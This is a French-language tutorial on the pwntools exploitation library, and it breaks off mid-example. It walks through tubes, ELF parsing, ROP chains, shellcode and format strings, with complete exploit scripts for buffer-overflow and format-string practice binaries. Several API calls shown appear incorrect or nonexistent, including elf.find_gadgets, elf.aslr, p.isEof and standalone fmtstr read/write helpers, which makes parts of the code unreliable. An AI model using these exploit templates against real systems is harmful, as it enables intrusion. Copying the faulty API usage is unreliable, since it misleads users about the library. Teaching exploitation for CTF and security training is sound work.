# 📚 Pwntools - Documentation Complète et Détaillée

**Version:** 4.x+  
**Langage:** Python 3  
**Auteur:** Documentation Complète  
**Dernière mise à jour:** 2026

---

## 📖 Table des Matières

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Concepts Fondamentaux](#concepts-fondamentaux)
4. [Communication avec les Serveurs (Tubes)](#communication-avec-les-serveurs-tubes)
5. [Packing et Unpacking](#packing-et-unpacking)
6. [ELF Parsing](#elf-parsing)
7. [ROP Chains](#rop-chains)
8. [Shellcode](#shellcode)
9. [Debugging avec GDB](#debugging-avec-gdb)
10. [Patterns et Cyclic](#patterns-et-cyclic)
11. [Logging et Context](#logging-et-context)
12. [Format String Exploitation](#format-string-exploitation)
13. [Utilitaires Avancés](#utilitaires-avancés)
14. [Exemples Complets](#exemples-complets)
15. [Best Practices](#best-practices)
16. [Troubleshooting](#troubleshooting)

---

## Introduction

### Qu'est-ce que Pwntools?

**Pwntools** est une bibliothèque Python conçue pour :
- 🔓 L'exploitation de binaires vulnérables
- 🎯 La création de payloads complexes
- 🏳️ Les compétitions CTF (Capture The Flag)
- 🔐 La sécurité offensive et les tests de pénétration

C'est essentiellement une **boîte à outils** qui automatise les tâches répétitives de l'exploitation.

### Pourquoi Pwntools?

**Sans pwntools** (long et ennuyeux) :
```python
import socket
import struct

s = socket.socket()
s.connect(("localhost", 1234))
payload = b"A" * 100 + struct.pack("<Q", 0x12345678)
s.send(payload)
response = s.recv(1024)
s.close()
```

**Avec pwntools** (court et élégant) :
```python
from pwn import *

p = remote("localhost", 1234)
p.send(b"A" * 100 + p64(0x12345678))
p.recv(1024)
```

### Cas d'Utilisation Typiques

- ✅ Buffer Overflow (BOF)
- ✅ Return-Oriented Programming (ROP)
- ✅ Format String Vulnerabilities
- ✅ Use-After-Free (UAF)
- ✅ Heap Exploitation
- ✅ Kernel Exploitation
- ✅ Reverse Engineering
- ✅ CTF Challenges

---

## Installation

### Prérequis

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install python3 python3-pip python3-dev git

# Sur macOS
brew install python3

# Pour certaines fonctionnalités supplémentaires
sudo apt-get install binutils-arm-linux-gnueabihf
sudo apt-get install binutils-aarch64-linux-gnu
```

### Installation Standard

```bash
# Installation simple via pip
pip3 install pwntools

# Ou version spécifique
pip3 install pwntools==4.10.1

# Installation depuis le dépôt GitHub (dernière version)
git clone https://github.com/Gallopsled/pwntools.git
cd pwntools
pip3 install -e .

# Mise à jour
pip3 install --upgrade pwntools
```

### Vérification de l'Installation

```bash
# Vérifier la version installée
python3 -c "from pwn import *; print(pwntools.__version__)"

# Affichage attendu:
# 4.10.0 (ou une version plus récente)

# Test simple
python3 << 'EOF'
from pwn import *
print("[+] Pwntools installé avec succès!")
EOF
```

### Configuration pour différents systèmes

**Linux x86_64 (Le plus courant)**
```bash
pip3 install pwntools
```

**Linux ARM**
```bash
sudo apt-get install binutils-arm-linux-gnueabihf
export ARCH=arm
```

**macOS**
```bash
# Homebrew
brew install pwntools

# Ou pip
pip3 install pwntools
```

**Windows (via WSL2)**
```bash
# Installez WSL2 d'abord
# Puis dans WSL: Ubuntu
pip3 install pwntools
```

---

## Concepts Fondamentaux

### Architecture et Context

Pwntools travaille avec le concept de "context" qui définit votre environnement cible.

```python
from pwn import *

# Définir le contexte (architecture cible)
context.arch = 'amd64'      # x86_64 (64-bit) - par défaut
# context.arch = 'i386'     # x86 (32-bit)
# context.arch = 'arm'      # ARM 32-bit
# context.arch = 'aarch64'  # ARM 64-bit
# context.arch = 'mips'     # MIPS

# Définir le système d'exploitation
context.os = 'linux'        # Linux (défaut)
# context.os = 'windows'    # Windows
# context.os = 'freebsd'    # FreeBSD

# Bits (sera auto-détecté, mais vous pouvez le forcer)
context.bits = 64           # 64-bit
# context.bits = 32         # 32-bit

# Endianness
context.endian = 'little'   # Little-endian (x86)
# context.endian = 'big'    # Big-endian (PowerPC, etc)

# Level de logging (debug, info, warning, error)
context.log_level = 'info'  # Par défaut: info
# context.log_level = 'debug'  # Affiche tout (très verbeux)

# Combiné
context.update(arch='amd64', os='linux', log_level='info')
```

### Module Structure

Pwntools est divisé en plusieurs modules :

```python
from pwn import *

# Les modules principaux importés automatiquement:
# - pwnlib.tubes        : Communication (TCP, processus, etc)
# - pwnlib.util         : Utilitaires (packing, CRC, etc)
# - pwnlib.shellcraft   : Génération de shellcode
# - pwnlib.asm          : Assemblage de code
# - pwnlib.disasm       : Désassemblage
# - pwnlib.elf          : Parsing de fichiers ELF
# - pwnlib.rop          : Chaînes ROP
# - pwnlib.gdb          : Intégration GDB
```

---

## Communication avec les Serveurs (Tubes)

Les "tubes" sont les objets qui gèrent la communication. C'est le cœur de pwntools.

### Types de Tubes

#### 1. Remote (Connexion TCP/UDP)

```python
from pwn import *

# ===== TCP =====
# Connexion TCP simple
p = remote("localhost", 4444)
p = remote("192.168.1.100", 8080)
p = remote("example.com", 443)

# Connexion TCP avec timeout
p = remote("localhost", 4444, timeout=5)

# Connexion TCP sur IPv6
p = remote("::1", 4444, fam="ipv6")

# ===== UDP =====
p = remote("localhost", 4444, sock_type="udp")

# Envoyer et recevoir
p.sendline(b"Hello")           # Envoyer + newline
p.send(b"Data")                # Envoyer sans newline
p.sendall(b"Data")             # Envoyer tout

response = p.recv(1024)        # Recevoir jusqu'à 1024 bytes
line = p.recvline()            # Recevoir jusqu'à \n
until_pattern = p.recvuntil(b">>>")  # Recevoir jusqu'à pattern
all_data = p.recvall()         # Recevoir tout jusqu'à EOF

# Fermer la connexion
p.close()
```

#### 2. Process (Exécution Locale)

```python
from pwn import *

# ===== Lancer un processus =====
p = process("./binary")                 # Binaire local
p = process(["/bin/bash", "-i"])       # Avec arguments
p = process("echo hello")               # Commande shell

# Avec arguments et environnement
env = os.environ.copy()
env["LD_PRELOAD"] = "/path/to/lib.so"
p = process("./binary", env=env)

# Définir le répertoire courant
p = process("./binary", cwd="/tmp")

# Désactiver ASLR (pour debugging)
p = process("./binary", aslr=False)

# Communication
p.sendline(b"input")
p.recvline()

# Attendre la fin
p.wait()

# Récupérer le code de sortie
exit_code = p.returncode
```

#### 3. SSH (Connexion SSH)

```python
from pwn import *

# Connexion SSH
s = ssh("user", "host", password="pass")
s = ssh("user", "host", key="/path/to/key")

# Exécuter une commande
result = s.process("whoami")
output = result.recv()

# Upload/Download
s.put("local_file", "remote_file")
s.get("remote_file", "local_file")

# Shell interactif
s.interactive()
```

#### 4. Sockets Personnalisés

```python
from pwn import *

# Créer un socket personnalisé
s = socket.socket()
s.connect(("localhost", 1234))

# Envelopper dans un tube pwntools
p = pwnlib.tubes.sock.sock(s)

p.send(b"data")
p.recv(100)
```

### Méthodes Principales des Tubes

```python
from pwn import *

p = remote("localhost", 1234)

# ===== ENVOI =====
p.send(data)                    # Envoyer données brutes
p.sendline(data)                # Envoyer + newline (\n)
p.sendall(data)                 # Envoyer tout (boucle jusqu'à succès)

# ===== RÉCEPTION =====
p.recv(1024)                    # Recevoir jusqu'à N bytes
p.recvline()                    # Recevoir une ligne (\n)
p.recvlines(5)                  # Recevoir 5 lignes
p.recvuntil(b">>>")             # Recevoir jusqu'à pattern
p.recvuntil(b">>>", timeout=10) # Avec timeout
p.recvall()                     # Recevoir jusqu'à EOF
p.recvregex(rb".*?#")           # Recevoir avec regex

# ===== SPÉCIAL =====
p.interactive()                 # Mode interactif (vous tappez)
p.settimeout(5)                 # Définir timeout
p.close()                        # Fermer
p.kill()                         # Tuer le processus
p.poll()                         # Vérifier si encore alive

# ===== INTROSPECTION =====
p.connected()                   # True/False si connecté
p.isEof()                        # True/False si EOF reçu
```

### Exemples Pratiques

#### Exemple 1 : Serveur qui demande un mot de passe

```python
from pwn import *

# Connexion
p = remote("localhost", 1234)

# Attendre le prompt
p.recvuntil(b"Mot de passe: ")

# Envoyer le mot de passe
p.sendline(b"secre123")

# Recevoir la réponse
response = p.recvline()
print(response)

p.close()
```

#### Exemple 2 : Interagir par étapes

```python
from pwn import *

p = process("./game")

# Étape 1
print(p.recvline())  # Afficher le message
p.sendline(b"1")     # Répondre "1"

# Étape 2
print(p.recvline())  # Afficher le message
p.sendline(b"yes")   # Répondre "yes"

# À partir d'ici, interaction manuelle
p.interactive()
```

#### Exemple 3 : Gérer plusieurs processus

```python
from pwn import *

# Serveur
server = process("./server")
time.sleep(1)  # Laisser le serveur démarrer

# Client
client = remote("localhost", 1234)

# Communication
client.sendline(b"hello server")
response = server.recvline()

client.close()
server.wait()
```

---

## Packing et Unpacking

Convertir entre nombres et bytes est essentiellement pour l'exploitation.

### Concepts de Base

```python
from pwn import *

# ===== PACKING (nombre → bytes) =====

# 32-bit (4 bytes)
p32(0x12345678)           # → b'\x78\x56\x34\x12' (little-endian)
p32(0x12345678, endian='big')  # → b'\x12\x34\x56\x78'

# 64-bit (8 bytes)
p64(0x123456789ABCDEF0)   # → bytes 8 (little-endian)
p64(0x123456789ABCDEF0, endian='big')

# 16-bit (2 bytes)
p16(0x1234)               # → b'\x34\x12' (little-endian)

# 8-bit (1 byte)
p8(0xFF)                  # → b'\xff'

# ===== UNPACKING (bytes → nombre) =====

# 32-bit
u32(b'\x78\x56\x34\x12')  # → 0x12345678 (little-endian)
u32(b'\x12\x34\x56\x78', endian='big')  # → 0x12345678

# 64-bit
u64(b'\x12\x34\x56\x78\x9a\xbc\xde\xf0')  # → 0x123456789ABCDEF0

# 16-bit
u16(b'\x34\x12')          # → 0x1234

# 8-bit
u8(b'\xff')               # → 255

# ===== VERSION SIGNÉE =====
ps32(0x12345678)          # Packed signed 32-bit
us32(b'...')              # Unpacked signed 32-bit
```

### Avancé : Signedness et Endianness

```python
from pwn import *

# Tous les formats
data = 0xDEADBEEF

# Format: p[s][size]
p32(data)           # Unsigned 32-bit, little-endian
ps32(data)          # Signed 32-bit, little-endian
p32(data, 'big')    # Unsigned 32-bit, big-endian

# Configurations globales
context.endian = 'little'  # Par défaut
# context.endian = 'big'

# Avec cette config, les p32/u32 utilisent big-endian
context.endian = 'big'
p32(0x12345678)     # → b'\x12\x34\x56\x78'

# Ou força à chaque fois
p32(0x12345678, endian='little')  # Override
```

### Cas d'Usage Réels

#### Exploit Buffer Overflow

```python
from pwn import *

elf = ELF("./binary")
win_func = elf.symbols['win']

# Créer le payload
buffer_size = 32
padding = 8
payload = b'A' * buffer_size
payload += b'B' * padding  # Padding entre buffer et retour
payload += p64(win_func)   # L'adresse (8 bytes sur 64-bit)

p = process("./binary")
p.sendline(payload)
p.interactive()
```

#### Leak d'Adresses

```python
from pwn import *

p = remote("localhost", 1234)

# Recevoir une adresse en format texte
p.recvuntil(b"Address: ")
addr_str = p.recvline().strip()
leaked_addr = int(addr_str, 16)  # Convertir de string hex

# Ou recevoir des bytes directs
p.recvuntil(b"Binary data: ")
binary_data = p.recv(8)
leaked_addr = u64(binary_data)   # Unpack 64-bit

print(f"Leaked address: {hex(leaked_addr)}")
```

---

## ELF Parsing

Analyser les fichiers exécutables pour extraire les adresses et informations.

### Charger un ELF

```python
from pwn import *

# Charger un binaire
elf = ELF("./binary")
elf = ELF("./binary", checksec=False)  # Sans vérifier la sécurité

# Afficher les infos de sécurité
print(elf.checksec())  # ASLR, NX, Canary, PIE, etc

# Affichage :
# [*] '/path/to/binary'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
```

### Symboles et Adresses

```python
from pwn import *

elf = ELF("./binary")

# ===== SYMBOLES =====
# Fonctions (si pas strippées)
main_addr = elf.symbols['main']
printf_addr = elf.symbols['printf']
system_addr = elf.symbols['system']

# Variables globales
elf.symbols['global_var']

# Vérifier si un symbole existe
if 'win' in elf.symbols:
    print(f"Found win at {hex(elf.symbols['win'])}")

# Tous les symboles
for name, addr in elf.symbols.items():
    print(f"{name}: {hex(addr)}")

# ===== SECTIONS =====
# Adresses de sections
elf.sections  # Dict de toutes les sections

# Adresse du point d'entrée
entry = elf.entry
print(f"Entry point: {hex(entry)}")

# ===== ADRESSE DE BASE =====
# Pour PIE (Position Independent Executable)
elf.base     # Adresse de base (0 si pas loadé)
```

### Tables Importantes

```python
from pwn import *

elf = ELF("./binary")

# ===== GOT (Global Offset Table) =====
# Utile pour GOT overwrite exploits
elf.got       # Dict des adresses GOT
elf.got['printf']  # Adresse GOT de printf
elf.got['malloc']  # Adresse GOT de malloc

# ===== PLT (Procedure Linkage Table) =====
# Utile pour ROP chains
elf.plt       # Dict des adresses PLT
elf.plt['printf']  # Adresse PLT de printf
elf.plt['system']  # Adresse PLT de system

# ===== RELLOCATIONS =====
elf.relocs    # Informations de relocation
```

### Chercher des Données

```python
from pwn import *

elf = ELF("./binary")

# ===== CHERCHER DES STRINGS =====
# Trouver l'offset d'une string en mémoire
offset = elf.find(b"flag")     # Retourne l'offset du 1er occurence
offset = next(elf.search(b"flag"))  # Même chose
offset = list(elf.search(b"flag"))  # Tous les occurrences

# Utiliser dans un exploit
bin_sh = next(elf.search(b"/bin/sh"))
print(f"/bin/sh found at {hex(bin_sh)}")

# ===== CHERCHER DES PATTERNS =====
# Trouver du code spécifique (opcodes)
matches = elf.find_gadgets("pop rdi; ret")
```

### Exemple Complet

```python
from pwn import *

binary = "./vulnerable"
elf = ELF(binary)

# Afficher l'info de sécurité
print(elf.checksec())

# Extraire les adresses critiques
if 'system' in elf.symbols:
    system_addr = elf.symbols['system']
    print(f"[+] system() @ {hex(system_addr)}")
else:
    print("[-] system() not found (probably stripped)")
    # Pour les binaires strippés, utiliser libc
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    system_addr = libc.symbols['system']
    print(f"[+] system() in libc @ {hex(system_addr)}")

# Chercher "/bin/sh"
if b"/bin/sh" in elf.data:
    bin_sh = next(elf.search(b"/bin/sh"))
    print(f"[+] /bin/sh @ {hex(bin_sh)}")
else:
    print("[-] /bin/sh not in binary, will leak from libc")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    bin_sh = next(libc.search(b"/bin/sh"))
    print(f"[+] /bin/sh in libc @ {hex(bin_sh)}")

# Afficher tous les symboles de fonction
print("\n[*] Fonctions :")
for name, addr in sorted(elf.symbols.items()):
    if elf.plt.get(name):  # Si c'est une fonction importée
        print(f"  {name:20} @ {hex(addr)}")
```

---

## ROP Chains

**ROP** (Return-Oriented Programming) : Chaîner les gadgets pour exécuter du code arbitraire.

### Concept Basique

```
Sans ROP:
  Stack:  [Buffer 32 bytes] [Padding 8] [Fonction à appeler]
  
Avec ROP:
  Stack:  [Buffer 32 bytes] [Padding 8] [pop rdi; ret] 
                                        [Argument 1]
                                        [pop rsi; ret]
                                        [Argument 2]
                                        [Fonction à appeler]
```

### Utiliser la classe ROP

```python
from pwn import *

elf = ELF("./binary")

# ===== CRÉER UN ROP CHAIN =====
rop = ROP(elf)

# Appeler une fonction avec arguments
rop.call("system", ["/bin/sh"])

# Construire le chain
chain = rop.chain()

# Utiliser dans l'exploit
payload = b'A' * 100
payload += chain
```

### Gadgets Manuels

```python
from pwn import *

elf = ELF("./binary")
rop = ROP(elf)

# Trouver les adresses
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"])[0]

# Construire manuellement
rop.raw(pop_rdi_ret)      # pop rdi
rop.raw(0x12345678)        # arg1
rop.raw(pop_rsi_ret)       # pop rsi
rop.raw(0x87654321)        # arg2
rop.raw(elf.symbols['system'])  # appel system()

chain = rop.chain()
```

### Gadgets Automatiques

```python
from pwn import *

# Utiliser pwntools pour trouver les gadgets
from pwnlib.rop.gadget import Gadget

elf = ELF("./binary")

# Trouver des gadgets spécifiques
gadgets = elf.search("pop rdi")  # Trouver "pop rdi" en x86-64

for gadget in gadgets:
    print(f"Found at {hex(gadget)}")
```

### Exemple Complet : ROP Chain

```python
from pwn import *

context.arch = 'amd64'
elf = ELF("./binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Adresses
main = elf.symbols['main']
system = libc.symbols['system']
binsh = next(libc.search(b"/bin/sh"))

# Création du ROP chain
rop = ROP(elf)

# Appel: system("/bin/sh")
rop.call("system", [binsh])

# Construire le payload
payload = b'A' * 100         # Buffer overflow
payload += rop.chain()       # ROP chain

# Envoyer
p = process("./binary")
p.sendline(payload)
p.interactive()
```

### Appels Système vs Fonctions

```python
from pwn import *

rop = ROP(elf)

# ===== APPEL FONCTION (C calling convention) =====
rop.call("system", ["/bin/sh"])      # system("/bin/sh")
rop.call("printf", ["Hello"])        # printf("Hello")
rop.call("exit", [0])                # exit(0)

# ===== APPELS SYSTÈME (syscall) =====
rop.call(rop.find_gadget(["syscall"])[0])  # Syscall direct

# Exemple: sys_execve pour x86-64
# rax = 59 (execve)
# rdi = pathname
# rsi = argv[]
# rdx = envp[]
```

---

## Shellcode

Générer du code machine qui exécute des actions (ex: spawner un shell).

### Shellcraft (Génération Automatique)

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# ===== SHELLCODE COMMUN =====

# Executer /bin/sh
shellcode = shellcraft.sh()

# Executer une commande spécifique
shellcode = shellcraft.execve("/bin/bash", ["/bin/bash"])

# Exit avec code
shellcode = shellcraft.exit(0)

# Read depuis stdin
shellcode = shellcraft.read(0, "rsp", 100)

# Write sur stdout
shellcode = shellcraft.write(1, "rsp", 100)

# syscall open
shellcode = shellcraft.open("/etc/passwd", 0)

# Assembler en bytecode
bytecode = asm(shellcode)
print(len(bytecode))  # Nombre de bytes
```

### Shellcode Personnalisé

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Code assembleur personnalisé
code = """
    mov rax, 1           ; sys_write
    mov rdi, 1           ; stdout
    mov rsi, [rsp]       ; data
    mov rdx, 13          ; length
    syscall
    
    mov rax, 60          ; sys_exit
    mov rdi, 0           ; exit code
    syscall
"""

# Assembler
shellcode = asm(code)

# Désassembler (pour vérifier)
print(disasm(shellcode))
```

### Utiliser Shellcode dans un Exploit

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF("./binary")

# Générer le shellcode
shellcode = asm(shellcraft.sh())

# Créer le payload
payload = b'A' * 100           # Remplir le buffer
payload += p64(shellcode_addr) # Adresse de la pile où on met le shellcode

# Payload alternatif (si on peut mettre le shellcode dans la pile)
payload = shellcode
payload += b'A' * (100 - len(shellcode))
payload += p64(stack_addr + offset)

# Envoyer
p = process("./binary")
p.sendline(payload)
p.interactive()
```

### Architectures Supportées

```python
from pwn import *

# x86
context.arch = 'i386'
shellcode = asm(shellcraft.sh())

# x86-64 (amd64)
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# ARM
context.arch = 'arm'
shellcode = asm(shellcraft.sh())

# ARM64
context.arch = 'aarch64'
shellcode = asm(shellcraft.sh())

# MIPS
context.arch = 'mips'
shellcode = asm(shellcraft.sh())

# PowerPC
context.arch = 'powerpc'
shellcode = asm(shellcraft.sh())
```

### Exemple Complet

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF("./binary")

# Générer /bin/sh shellcode (minimum ~50 bytes)
shellcode = asm(shellcraft.sh())
log.info(f"[+] Shellcode size: {len(shellcode)} bytes")

# Payload
buffer_size = 64
payload = shellcode
payload += b'\x90' * (buffer_size - len(shellcode))  # Padding avec NOPs
payload += p64(elf.bss(0x100))  # Adresse où on met le shellcode

# Exploit
p = process("./binary")
p.sendline(payload)
time.sleep(0.5)
p.sendline(b"whoami")
p.interactive()
```

---

## Debugging avec GDB

Intégrer GDB pour debugger pendant l'exploitation.

### Lancer avec GDB

```python
from pwn import *

# ===== LANCER LE BINAIRE DANS GDB =====
p = gdb.debug("./binary", gdbscript="""
    # Commandes GDB à exécuter au démarrage
    break main
    continue
""")

# Le script GDB s'exécute, puis vous pouvez interagir avec p
p.sendline(b"test")
```

### Attacher GDB à un Processus

```python
from pwn import *

# Lancer le binaire
p = process("./binary", stdin=subprocess.PIPE, stdout=subprocess.PIPE)

# Attacher GDB
gdb.attach(p, gdbscript="""
    break main
    continue
""")

# Continuer avec pwntools
p.sendline(b"test")
```

### Points d'Arrêt

```python
from pwn import *

# Pause et launch GDB
p = process("./binary")
p.sendline(b"test data")

# À ce point, arrêt et GDB s'ouvre
gdb.attach(p, gdbscript="""
    break *0x08048000
    continue
""")

# Continuer
p.interactive()
```

### Inspection de Mémoire

```python
from pwn import *

p = process("./binary")

# Vous pouvez utiliser GDB pour inspecter
# Puis revenir à pwntools
gdb.attach(p)

# Votre exploit continue
p.sendline(b"payload")
```

### Exemple Complet

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF("./binary")

# Lancer avec GDB
p = gdb.debug("./binary", gdbscript="""
    # Casser au main
    break main
    continue
    
    # Inspecter la stack
    # (vous pouvez taper les commandes dans GDB)
""")

# Envoyer des données
p.sendline(b"test")
p.recvline()

# Attacher à nouveau pour plus de debug
gdb.attach(p, gdbscript="""
    break *0x0804843f
    continue
""")

p.interactive()
```

---

## Patterns et Cyclic

**Cyclic** génère des patterns pour trouver des offsets.

### Générer des Patterns

```python
from pwn import *

# Générer un pattern de 100 bytes
pattern = cyclic(100)
# Output: b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaa...'

# Les lettres se répètent en séquences : aaaa, baaa, caaa, etc
# Cela permet de localiser exactement où le overflow casse les choses
```

### Trouver les Offsets

```python
from pwn import *

# Vous crashez avec rip = 0x61616161
# Trouver où c'est dans le pattern
offset = cyclic_find(0x61616161)
# Output: 0

# Ou avec des bytes
offset = cyclic_find(b"aaab")
# Vous donne la position exacte

# Ou si vous connaissez le pattern
pattern = cyclic(100)
p.sendline(pattern)
# Regardez où il crash dans GDB
# Puis cherchez les bytes spécifiques
```

### Utilisation Pratique

```python
from pwn import *

elf = ELF("./binary")

# Étape 1 : Envoyer un pattern
pattern = cyclic(200)
p = process("./binary")
p.sendline(pattern)

# Étape 2 : Regarder où ça crash dans GDB
# gdb> x/i $rip  # Montrer l'instruction à RIP
# gdb> p $rip    # Afficher RIP

# Étape 3 : Calculer l'offset
# RIP = 0x6161616161616161
rip_value = 0x6161616161616161
# Mais cyclic retourne des bytes, pas des nombres
# Donc :
rip_bytes = p64(0x6161616161616161)
offset = cyclic_find(rip_bytes)

print(f"Offset to RIP: {offset}")

# Étape 4 : Utiliser dans l'exploit
payload = cyclic(offset)
payload += p64(win_func_addr)
```

### Exemple Complet

```python
from pwn import *

def find_offset():
    """Trouver l'offset d'un buffer overflow"""
    # Générer un pattern
    pattern = cyclic(300)
    
    # Lancer le binaire avec GDB
    p = gdb.debug("./binary", gdbscript="""
        run
        # Le programme va crasher
        # Regardez la valeur de RSP/RBP
    """)
    
    p.sendline(pattern)
    p.wait()
    
    # Une fois que vous connaissez la valeur de crash
    # crash_value = 0x6161616161616161
    crash_bytes = b'jaaak'  # Exemple
    offset = cyclic_find(crash_bytes)
    
    return offset

offset = find_offset()
print(f"[+] Buffer offset: {offset}")

# Utiliser l'offset dans l'exploit
WIN_ADDR = 0x08048450
payload = cyclic(offset)
payload += p32(WIN_ADDR)
```

---

## Logging et Context

Configurer le logging pour mieux suivre votre exploit.

### Configuration du Logging

```python
from pwn import *

# ===== LOG LEVELS =====
context.log_level = 'debug'    # Tout (très verbeux)
context.log_level = 'info'     # Info + success + warning + error (défaut)
context.log_level = 'warning'  # Warning + error uniquement
context.log_level = 'error'    # Erreurs uniquement

# ===== UTILISER LE LOGGING =====
log.debug("Message de debug")
log.info("Message d'info")
log.success("Succès!")
log.warning("Attention!")
log.failure("Erreur!")

# Exemple
log.info(f"[*] Connecté au serveur")
log.success(f"[+] Exploit réussi!")
log.failure(f"[-] Impossible de trouver l'adresse")
```

### Context Configuré

```python
from pwn import *

# Configurer le context une fois
context.arch = 'amd64'
context.os = 'linux'
context.bits = 64
context.endian = 'little'
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']  # Terminal pour GDB

# Ou utiliser update
context.update(
    arch='amd64',
    os='linux',
    log_level='info',
    timeout=10
)

# Le context est global
p = process("./binary")  # Utilisera les settings du context
elf = ELF("./binary")    # Idem
```

### Affichage Personnalisé

```python
from pwn import *

# Messages avec tags
log.info("Étape 1")
log.info("Étape 2")
log.success("Exploit réussi")

# Sortie attendue :
# [*] Étape 1
# [*] Étape 2
# [+] Exploit réussi

# Format personnalisé
import sys
print("[DEBUG] Message spécifique", file=sys.stderr)
```

---

## Format String Exploitation

Exploiter les vulnérabilités de Format String.

### Concept Basique

```c
// Code vulnérable en C
char input[100];
scanf("%s", input);
printf(input);  // DANGER! Format String!
```

```python
from pwn import *

# Une format string peut :
# 1. Lire la mémoire : %x, %p, %s
# 2. Écrire en mémoire : %n
# 3. Exécuter du code (ROP + Format String)

p = remote("localhost", 1234)

# ===== LIRE LA MÉMOIRE =====
# Lire les valeurs sur la stack
payload = b"AAAA %x %x %x %x"
p.sendline(payload)
output = p.recvline()

# Lire une string
payload = b"AAAA %s"  # Lire string à address sur stack
p.sendline(payload)
output = p.recvline()

# ===== ÉCRIRE EN MÉMOIRE =====
# Écrire avec %n (écrit le nombre de chars dans l'adresse)
# target_addr = 0x12345678
payload = p32(target_addr) + b"%x." * 8 + b"%n"
p.sendline(payload)
```

### FmtStr Automatique (pwntools)

```python
from pwn import *

# Pwntools peut automatiser les format strings!
from pwnlib.fmtstr import *

# Créer un FmtStr avec un oracle
def fmt_oracle(payload):
    """Envoie un payload et retourne la réponse"""
    p = remote("localhost", 1234)
    p.sendline(payload)
    result = p.recvline()
    p.close()
    return result

# Trouver l'offset
offset = find_fmt_offset(fmt_oracle)
print(f"Format string offset: {offset}")

# Lire de la mémoire
data = read(offset, fmt_oracle, 0x12345678)  # Lire à 0x12345678

# Écrire en mémoire
write(offset, fmt_oracle, {0x12345678: 0x11223344})  # target: value
```

### Exemple Complet

```python
from pwn import *
from pwnlib.fmtstr import *

context.log_level = 'info'

target_addr = 0x08048500
new_value = 0x41414141

# Fonction oracle pour les format strings
def fmt_oracle(payload):
    p = process("./vulnerable")
    p.sendline(payload)
    result = p.recvline()
    p.close()
    return result

log.info("[*] Trouvant l'offset...")
offset = find_fmt_offset(fmt_oracle)
log.success(f"[+] Offset: {offset}")

log.info("[*] Écrivant en mémoire...")
write(offset, fmt_oracle, {target_addr: new_value})
log.success(f"[+] Écrit {hex(new_value)} à {hex(target_addr)}")
```

---

## Utilitaires Avancés

Autres outils et fonctionnalités utiles.

### DynELF (Déboguer les Binaires Dynamiques)

```python
from pwn import *
from pwnlib.dynelf import DynELF

# Pour les binaires avec ASLR, vous devez leaker des adresses
# DynELF peut résoudre les symboles dynamiquement

def leak_func(addr):
    """Fonction pour leaker 4 bytes à addr"""
    p = remote("localhost", 1234)
    p.sendline(payload_that_leaks_at(addr))
    data = p.recvline()
    p.close()
    return data

# Créer un DynELF
d = DynELF(leak_func, elf=ELF("./binary"))

# Résoudre les symboles
system_addr = d.lookup("system")  # Retourne l'adresse de system() en mémoire
printf_addr = d.lookup("printf")
```

### Checksec (Vérifier les Protections)

```python
from pwn import *

elf = ELF("./binary")

# Afficher les protections
print(elf.checksec())

# Output:
# [*] '/path/to/binary'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
#     RUNPATH:  b'./lib'

# Vérifier les flags individuels
if elf.nx:
    print("NX est activé")
if elf.aslr:
    print("ASLR est activé")
if elf.pie:
    print("PIE est activé")
if elf.relro:
    print("RELRO est activé")
if elf.canary:
    print("Stack Canary est activé")
```

### Heap Exploitation Tools

```python
from pwn import *
from pwnlib.heap import *

# Analyser un heap (utilisé dans les exploits heap)
# Pas couvert en détail ici, mais disponible

# Utiliser les allocators
context.libc = "glibc"  # ou "musl"
```

### Encodeurs/Décodeurs

```python
from pwn import *

# XOR
xored = xor(b"hello", b"key")

# Convertir en hex
hex_str = hex(0x12345678)

# CRC
crc = crc32(b"data")

# Autres
base64.b64encode(b"data")
```

### Communication Avancée

```python
from pwn import *

p = remote("localhost", 1234)

# ===== INTERACTIVE =====
# Mode interactif (vous avez le contrôle du clavier)
p.interactive()

# ===== CLEAN EXIT =====
p.sendline(b"exit")
p.close()

# ===== MULTIPLE RECEIVE =====
# Recevoir jusqu'à atteindre un nombre de bytes
data = b""
while len(data) < 1024:
    data += p.recv(min(1024, 1024 - len(data)))

# ===== TIMEOUT MANAGEMENT =====
p.settimeout(5)
try:
    data = p.recv(100)
except socket.timeout:
    log.failure("Timeout while receiving")
```

---

## Exemples Complets

### Exemple 1 : Buffer Overflow Simple

**Binaire vulnérable** :
```c
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

int main() {
    char buf[32];
    gets(buf);  // Vulnérable!
    return 0;
}
```

**Exploit pwntools** :
```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'info'

# Charger le binaire
elf = ELF("./vuln")

# Adresse de win()
win_addr = elf.symbols['win']
log.info(f"[*] win() @ {hex(win_addr)}")

# Payload
# Buffer = 32 bytes
# Adresse de retour = 4 bytes
offset = 32 + 4

payload = b'A' * offset
payload += p32(win_addr)

# Exploit
p = process("./vuln")
p.sendline(payload)
p.interactive()
```

### Exemple 2 : Format String Leak

**Code vulnérable** :
```c
#include <stdio.h>

int secret = 0x12345678;

int main() {
    char buf[100];
    fgets(buf, sizeof(buf), stdin);
    printf(buf);  // Format string!
    return 0;
}
```

**Exploit** :
```python
from pwn import *

p = process("./vuln")

# Format string pour lire la stack
payload = b"AAAA %x %x %x %x %x"
p.sendline(payload)

output = p.recvline()
print(output)

# Lire une adresse spécifique
